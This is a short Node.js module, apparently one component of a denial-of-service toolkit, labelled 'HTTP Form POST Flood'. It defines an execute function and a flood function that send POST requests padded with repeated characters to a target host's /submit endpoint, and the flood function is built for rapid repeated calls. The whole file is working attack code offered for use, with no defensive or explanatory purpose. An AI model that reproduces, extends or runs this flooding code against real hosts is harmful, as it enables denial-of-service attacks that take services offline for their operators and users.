const http = require('http');
const https = require('https');
const querystring = require('querystring');

module.exports = {
    name: 'HTTP Form POST Flood',
    description: 'POST requests with form data',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        const formData = querystring.stringify({
            field1: 'x'.repeat(500),
            field2: 'x'.repeat(500),
            field3: Date.now().toString()
        });
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/submit',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': Buffer.byteLength(formData)
                }
            }, (res) => {
                resolve({ status: res.statusCode });
                req.destroy();
            });
            
            req.write(formData);
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        const formData = querystring.stringify({ data: 'x'.repeat(1000) });
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/submit',
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.write(formData);
        req.end();
        req.on('error', () => callback(false));
    }
};